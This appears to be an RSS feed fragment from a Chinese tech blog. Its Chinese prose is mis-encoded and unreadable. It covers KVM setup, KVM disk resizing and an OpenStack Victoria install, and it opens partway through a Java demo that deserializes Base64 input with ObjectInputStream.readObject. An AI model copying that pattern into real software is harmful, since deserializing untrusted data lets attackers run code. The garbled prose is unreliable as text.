&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">byte&lt;/span>&lt;span style="color:#ff79c6">[]&lt;/span> bytes &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getDecoder&lt;/span>().&lt;span style="color:#50fa7b">decode&lt;/span>(data.&lt;span style="color:#50fa7b">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#50fa7b">UTF_8&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayInputStream(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectInputStream input &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectInputStream(b)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Command obj &lt;span style="color:#ff79c6">=&lt;/span> (Command) input.&lt;span style="color:#50fa7b">readObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;ååºåˆ—åŒ–: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> obj.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡Œåè¾“å‡ºï¼š&lt;/p></description></item><item><title>openstack victoriaç‰ˆå®‰è£…</title><link>https://www.typesafe.cn/posts/install-openstack-victoria/</link><pubDate>Sat, 12 Jun 2021 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/install-openstack-victoria/</guid><description>&lt;p>è¿‘æœŸå…¬å¸ä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦å®‰è£…ä¸€å¥—Openstackç¯å¢ƒå­¦ä¹ ï¼Œçœ‹äº†ä¸€ä¸‹ç°åœ¨å·²ç»å‡ºäº†&lt;code>wallaby&lt;/code>ç‰ˆäº†ï¼Œæˆ‘æœæ–­é€‰æ‹©äº†ä¸Šä¸€ä¸ªç‰ˆæœ¬&lt;code>victoria&lt;/code>ã€‚å› ä¸ºæ²¡æœ‰è¶³å¤Ÿå¤šçš„ç‰©ç†æœåŠ¡å™¨äº†ï¼Œåªå¥½æ‰¾äº†ä¸€å°64æ ¸256Gå†…å­˜6Tç¡¬ç›˜çš„æœºå™¨æ¥åˆ›å»ºå‡ å°è™šæ‹Ÿæœºæ¥æ­ç¯å¢ƒäº†ã€‚&lt;/p>
&lt;h1 id="å®éªŒç¯å¢ƒ">å®éªŒç¯å¢ƒ&lt;/h1>
&lt;p>æ­¤æ¬¡å®éªŒä½¿ç”¨åˆ°äº†ä¸‰å°è™šæ‹Ÿæœºï¼Œéƒ½æ˜¯ä½¿ç”¨centos8ç³»ç»Ÿï¼Œä¸€å°æœºå™¨å½“ä½œæ§åˆ¶å’Œç½‘ç»œèŠ‚ç‚¹ï¼Œå¦å¤–ä¸¤å°å½“ä½œè®¡ç®—èŠ‚ç‚¹ï¼Œä½¿ç”¨OVS+VLANçš„ç½‘ç»œæ¨¡å¼ï¼Œeth0ä½œä¸ºç®¡ç†ç½‘ç»œï¼Œeth1äº’ç›¸è¿æ¥åˆ°OVSç½‘æ¡¥ä¸Šæ¨¡æ‹Ÿtrunkç½‘å¡ï¼Œcontrollerå¤šå¢åŠ ä¸€ä¸ªeth2ç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>èŠ‚ç‚¹&lt;/th>
 &lt;th>ä½œç”¨&lt;/th>
 &lt;th>eth0&lt;/th>
 &lt;th>eth1&lt;/th>
 &lt;th>eth2&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>controller&lt;/td>
 &lt;td>æ§åˆ¶èŠ‚ç‚¹ã€ç½‘ç»œèŠ‚ç‚¹&lt;/td>
 &lt;td>172.16.10.100&lt;/td>
 &lt;td>æ— IP&lt;/td>
 &lt;td>æ¡¥æ¥ï¼Œæ— IP&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-101&lt;/td>
 &lt;td>è®¡ç®—èŠ‚ç‚¹&lt;/td>
 &lt;td>172.16.10.101&lt;/td>
 &lt;td>æ— IP&lt;/td>
 &lt;td>âŒ&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>compute-102&lt;/td>
 &lt;td>è®¡ç®—èŠ‚ç‚¹&lt;/td>
 &lt;td>172.16.10.102&lt;/td>
 &lt;td>æ— IP&lt;/td>
 &lt;td>âŒ&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h1 id="å®‰è£…è™šæ‹Ÿæœº">å®‰è£…è™šæ‹Ÿæœº&lt;/h1>
&lt;h2 id="å®‰è£…ä¾èµ–">å®‰è£…ä¾èµ–&lt;/h2>
&lt;p>å®‰è£…KVMå’ŒLinuxç½‘æ¡¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>&lt;code>dejavu-lgc-sans-fonts&lt;/code>ç”¨äºè§£å†³ &lt;code>virt-manaer&lt;/code> ä¹±ç &lt;/p>&lt;/blockquote>
&lt;p>å¯åŠ¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> libvirtd &lt;span style="color:#ff79c6">&amp;amp;&amp;amp;&lt;/span> systemctl start libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®‰è£…OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯åŠ¨OVS&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> openvswitch &lt;span style="color:#ff79c6">&amp;amp;&amp;amp;&lt;/span> systemctl start openvswitch
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="åˆ›å»ºè™šæ‹Ÿæœº">åˆ›å»ºè™šæ‹Ÿæœº&lt;/h3>
&lt;p>ä½¿ç”¨ virt-manager åˆ›å»ºä¸‰å°è™šæ‹Ÿæœº&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-nodes.png" alt="image-20210604140054913">&lt;/p>
&lt;h3 id="é…ç½®ç½‘ç»œ">é…ç½®ç½‘ç»œ&lt;/h3>
&lt;h4 id="é…ç½®ç®¡ç†ç½‘å¡">é…ç½®ç®¡ç†ç½‘å¡&lt;/h4>
&lt;p>ç»™è™šæ‹Ÿæœºé…ç½®æ¡¥æ¥ç½‘ç»œï¼Œå‚è€ƒ&lt;a href="https://typesafe.cn/posts/linux-kvm/">Linuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM&lt;/a>ï¼Œæ•ˆæœå¦‚å›¾&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/vm-manage-port-config.png" alt="">&lt;/p>
&lt;h4 id="é…ç½®trunkç½‘å¡">é…ç½®trunkç½‘å¡&lt;/h4>
&lt;p>ä½¿ç”¨ovsåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ovs-vsctl add-br br-vlan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ­¤æ—¶ç½‘æ¡¥&lt;code>br-vlan&lt;/code>ä¸Šæ˜¯æ²¡æœ‰ä»»ä½•è™šæ‹Ÿç½‘å¡çš„ï¼Œç„¶åå…³é—­è™šæ‹Ÿæœºï¼Œåœ¨&lt;code>virt-manager&lt;/code>ä¸Šæ·»åŠ ä¸€ä¸ªç½‘ç»œè®¾å¤‡&lt;/p></description></item><item><title>KVM è™šæ‹Ÿæœºç£ç›˜æ‰©å®¹</title><link>https://www.typesafe.cn/posts/kvm-disk-resize/</link><pubDate>Mon, 31 May 2021 19:20:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/kvm-disk-resize/</guid><description>&lt;h3 id="ä¸€é•œåƒæ‰©å®¹">ä¸€ã€é•œåƒæ‰©å®¹&lt;/h3>
&lt;p>æ³¨æ„ï¼šéœ€è¦å…ˆå…³é—­è™šæ‹Ÿæœºæ‰èƒ½æ“ä½œï¼Œ&lt;code>+&lt;/code>å·å‰é¢æœ‰ç©ºæ ¼ï¼Œåé¢æ²¡æœ‰ç©ºæ ¼ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img resize test.qcow2 +80G
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åŸé•œåƒç£ç›˜å¤§å°20GBï¼Œæ‰©å®¹å®Œæˆåå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>qemu-img info test.qcow2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¾“å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>image: test.qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>file format: qcow2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>virtual size: 100G &lt;span style="color:#ff79c6">(&lt;/span>&lt;span style="color:#bd93f9">107374182400&lt;/span> bytes&lt;span style="color:#ff79c6">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>disk size: 885M
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cluster_size: &lt;span style="color:#bd93f9">65536&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Format specific information:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> compat: 1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lazy refcounts: &lt;span style="color:#8be9fd;font-style:italic">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> refcount bits: &lt;span style="color:#bd93f9">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> corrupt: &lt;span style="color:#8be9fd;font-style:italic">false&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="äºŒwindowsç£ç›˜æ‰©å®¹">äºŒã€Windowsç£ç›˜æ‰©å®¹&lt;/h3>
&lt;p>Windowsç£ç›˜æ‰©å®¹æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿›å…¥ &lt;strong>è®¡ç®—æœºç®¡ç†&amp;gt;ç£ç›˜ç®¡ç†&lt;/strong> æ‰¾åˆ°æ–°å¢çš„åˆ†åŒºæŠŠå®ƒæ·»åŠ åˆ°éœ€è¦çš„åˆ†åŒºå³å¯ã€‚&lt;/p>
&lt;h3 id="ä¸‰linuxç£ç›˜æ‰©å®¹">ä¸‰ã€Linuxç£ç›˜æ‰©å®¹&lt;/h3>
&lt;p>å¯åŠ¨è™šæ‹Ÿæœºåï¼Œè¿›å…¥è™šæ‹Ÿæœºæ§åˆ¶å°ï¼Œä½¿ç”¨&lt;code>fdisk -l&lt;/code>å‘½ä»¤æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Disk /dev/vda: &lt;span style="color:#bd93f9">100&lt;/span> GiB, &lt;span style="color:#bd93f9">107374182400&lt;/span> bytes, &lt;span style="color:#bd93f9">209715200&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disklabel type: dos
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk identifier: 0xe11f7f01
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device Boot Start End Sectors Size Id Type
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda1 * &lt;span style="color:#bd93f9">2048&lt;/span> &lt;span style="color:#bd93f9">2099199&lt;/span> &lt;span style="color:#bd93f9">2097152&lt;/span> 1G &lt;span style="color:#bd93f9">83&lt;/span> Linux
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/dev/vda2 &lt;span style="color:#bd93f9">2099200&lt;/span> &lt;span style="color:#bd93f9">41943039&lt;/span> &lt;span style="color:#bd93f9">39843840&lt;/span> 19G 8e Linux LVM
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-root: &lt;span style="color:#bd93f9">17&lt;/span> GiB, &lt;span style="color:#bd93f9">18249416704&lt;/span> bytes, &lt;span style="color:#bd93f9">35643392&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-swap: &lt;span style="color:#bd93f9">2&lt;/span> GiB, &lt;span style="color:#bd93f9">2147483648&lt;/span> bytes, &lt;span style="color:#bd93f9">4194304&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#bd93f9">1&lt;/span> * &lt;span style="color:#8be9fd;font-style:italic">512&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#ff79c6">(&lt;/span>logical/physical&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#ff79c6">(&lt;/span>minimum/optimal&lt;span style="color:#ff79c6">)&lt;/span>: &lt;span style="color:#bd93f9">512&lt;/span> bytes / &lt;span style="color:#bd93f9">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°è¿™å°è™šæ‹Ÿæœºçš„ç£ç›˜å¤§å°å·²ç»æœ‰100GBäº†ï¼Œä½†åˆ†åŒºå¤§å°è¿˜æ˜¯æ²¡æœ‰å˜åŒ–ï¼Œåªæœ‰åˆå§‹å¤§å°20GBã€‚&lt;/p></description></item><item><title>Linuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM</title><link>https://www.typesafe.cn/posts/linux-kvm/</link><pubDate>Sat, 29 May 2021 17:07:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/linux-kvm/</guid><description>&lt;p>åœ¨Windowså¹³å°ä¸Šæˆ‘ä»¬ä¹ æƒ¯äºä½¿ç”¨VmWareæˆ–è€…virtual boxæ¥å®ç°è™šæ‹ŸåŒ–ï¼Œè™½ç„¶å®ƒä»¬æ‹¥æœ‰Linuxç‰ˆæœ¬ï¼Œä½†å¤§å¤šæ•°ä¼ä¸šéƒ½é€‰æ‹©äº†ä½¿ç”¨KVMæ¥åšLinuxå¹³å°çš„è™šæ‹ŸåŒ–ï¼Œå› æ­¤å­¦ä¹ æŒæ¡KVMæ˜¯ä¸€é¡¹å¿…ä¸å¯å°‘çš„æŠ€èƒ½ã€‚&lt;/p>
&lt;h3 id="å®‰è£…kvm">å®‰è£…KVM&lt;/h3>
&lt;p>ä»¥centosä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯å®‰è£…KVMè™šæ‹ŸåŒ–çš„å‘½ä»¤ã€‚&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install -y qemu-kvm libvirt virt-install bridge-utils
&lt;/code>&lt;/pre>&lt;p>&lt;strong>è¿™ä¹ˆå¤šè½¯ä»¶éƒ½æ˜¯ä»€ä¹ˆä½œç”¨ï¼Ÿ&lt;/strong>&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>è½¯ä»¶&lt;/th>
 &lt;th>ä½œç”¨&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>qemu-kvm&lt;/td>
 &lt;td>æ•´åˆäº†QEMU å’Œ KVM çš„ä¸€ä¸ªè½¯ä»¶ã€‚&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>libvirt&lt;/td>
 &lt;td>å°è£…äº†QEMUçš„æ¥å£ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ“ä½œè™šæ‹Ÿæœºï¼Œå¹¶ä¸”æä¾›äº†å¾ˆå¤šç§ç¼–ç¨‹è¯­è¨€çš„SDKã€‚&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>virt-install&lt;/td>
 &lt;td>ç”¨æ¥åˆ›å»ºè™šæ‹Ÿæœºçš„å‘½ä»¤è¡Œå·¥å…·ã€‚&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>bridge-utils&lt;/td>
 &lt;td>Linuxç½‘æ¡¥ï¼Œç”¨æ¥é…ç½®è™šæ‹Ÿæœºçš„æ¡¥æ¥ç½‘ç»œã€‚&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>kvmã€qemuã€qemu-kvmå’Œlibvirtåˆ°åº•æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ&lt;/strong>&lt;/p>
&lt;p>KVMï¼ˆKernel Virtual Machineï¼‰æ˜¯Linuxçš„ä¸€ä¸ªå†…æ ¸é©±åŠ¨æ¨¡å—ï¼Œå®ƒéœ€è¦CPUçš„æ”¯æŒï¼Œé‡‡ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯Intel-VTã€AMD-Vï¼›å†…å­˜ç›¸å…³å¦‚Intelçš„EPTå’ŒAMDçš„RVIæŠ€æœ¯ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿè®©Linuxä¸»æœºæˆä¸ºä¸€ä¸ªHypervisorï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ã€‚&lt;/p>
&lt;p>QEMUæ˜¯ä¸€ä¸ªçº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿæœºï¼Œå®ƒå¯ä»¥æ¨¡æ‹ŸCPUã€å†…å­˜ã€ç£ç›˜ç­‰å…¶ä»–ç¡¬ä»¶ï¼Œè®©è™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±åº•å±‚å°±æ˜¯ç¡¬ä»¶ï¼Œå…¶å®è¿™äº›éƒ½æ˜¯QEMUæ¨¡æ‹Ÿçš„ï¼Œè™šæ‹Ÿæœºçš„æ‰€æœ‰æ“ä½œéƒ½è¦ç»è¿‡QEMUè½¬è¯‘ä¸€å±‚ï¼Œä¹Ÿå°±å¯¼è‡´äº†QEMUæœ¬èº«çš„æ€§èƒ½è¾ƒå·®ã€‚&lt;/p>
&lt;p>qemu-kvmæ˜¯QEMUæ•´åˆäº†KVMï¼ŒæŠŠCPUè™šæ‹ŸåŒ–å’Œå†…å­˜è™šæ‹ŸåŒ–äº¤ç»™äº†KVMæ¥åšï¼Œè‡ªå·±æ¥æ¨¡æ‹ŸIOè®¾å¤‡ï¼Œä¾‹å¦‚ç½‘å¡å’Œç£ç›˜ã€‚è¿™ä¸€å¥—ç»„åˆæ‹³æ‰“ä¸‹æ¥ï¼Œæ€§èƒ½æŸå¤±å¤§å¤§é™ä½ï¼Œç›¸è¾ƒäºç›´æ¥ä½¿ç”¨ç¡¬ä»¶ï¼Œå¸¦æ¥çš„æŸè€—å¤§æ¦‚åœ¨1%-2%ä¹‹é—´ã€‚&lt;/p>
&lt;p>libvirtæ˜¯ç›®å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„å¯¹KVMè™šæ‹Ÿæœºè¿›è¡Œç®¡ç†çš„å·¥å…·å’ŒAPIã€‚Libvirtdæ˜¯ä¸€ä¸ªdaemonè¿›ç¨‹ï¼Œå¯ä»¥è¢«æœ¬åœ°çš„virshè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«è¿œç¨‹çš„virshè°ƒç”¨ï¼ŒLibvirtdè°ƒç”¨qemu-kvmæ“ä½œè™šæ‹Ÿæœºã€‚&lt;/p>
&lt;p>&lt;strong>å¯åŠ¨libvirt&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl start libvirtd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl &lt;span style="color:#8be9fd;font-style:italic">enable&lt;/span> libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœä½ ä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æ¥ç®¡ç†è™šæ‹Ÿæœºï¼Œå¯ä»¥å®‰è£… virt-manager ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y virt-manager
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨æ”¯æŒx11è½¬å‘çš„sshå®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ï¼š&lt;a href="https://mobaxterm.mobatek.net/">MobaXterm&lt;/a>ï¼‰ä¸Šå¯ä»¥ç›´æ¥è¾“å…¥ virt-manager æ¥å¯åŠ¨ã€‚&lt;/p>
&lt;h3 id="è™šæ‹Ÿç½‘ç»œç±»å‹">è™šæ‹Ÿç½‘ç»œç±»å‹&lt;/h3>
&lt;p>å’Œvmwareç±»å‹ï¼Œkvmä¹Ÿæ”¯æŒå¤šç§ç±»å‹çš„ç½‘ç»œï¼Œä¸»è¦åˆ†ä¸ºä¸‰ç§ã€‚&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>NATæ¨¡å¼&lt;/strong> è™šæ‹Ÿæœºéœ€è¦æŠŠæµé‡å‘é€åˆ°å®¿ä¸»æœºï¼Œå®¿ä¸»æœºå™¨è½¬æ¢ç½‘ç»œä¿¡æ¯åå†å‘å‡ºï¼Œå¤–éƒ¨æœºå™¨æ— æ³•æ„ŸçŸ¥åˆ°è™šæ‹Ÿæœºçš„å­˜åœ¨ã€‚æ­¤ç§æ–¹å¼å®¿ä¸»æœºå™¨ç›¸å½“äºä¸€ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤å®¿ä¸»æœºä¸Šä¼šæœ‰ä¸€ä¸ªå’Œè™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå¹¶ä¸”è™šæ‹Ÿæœºçš„ç½‘å…³åœ°å€æ˜¯å®¿ä¸»æœºçš„è¿™ä¸ªIPã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>ä¸»æœºæ¨¡å¼&lt;/strong> è™šæ‹Ÿæœºåªèƒ½äº’ç›¸è®¿é—®ï¼Œä¸èƒ½è®¿é—®å®¿ä¸»æœºã€‚æ­¤ç§æ–¹å¼ä¸NATæ¨¡å¼ç±»ä¼¼ï¼Œä½†å®ƒæ²¡æœ‰ä¸è™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå› æ­¤è™šæ‹Ÿæœºä¹Ÿä¸èƒ½å€ŸåŠ©äºå®¿ä¸»æœºæ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>æ¡¥æ¥æ¨¡å¼&lt;/strong> è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºéƒ½å…³è”åœ¨ä¸€ä¸ªç½‘æ¡¥ä¸Šï¼Œå› æ­¤è™šæ‹Ÿæœºå¯ä»¥ä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¹¶ä¸”å¤–éƒ¨æœºå™¨å¯ä»¥ç›´æ¥è®¿é—®åˆ°è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹Ÿå¯ä»¥å€ŸåŠ©ç½‘æ¡¥æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p>
&lt;blockquote>
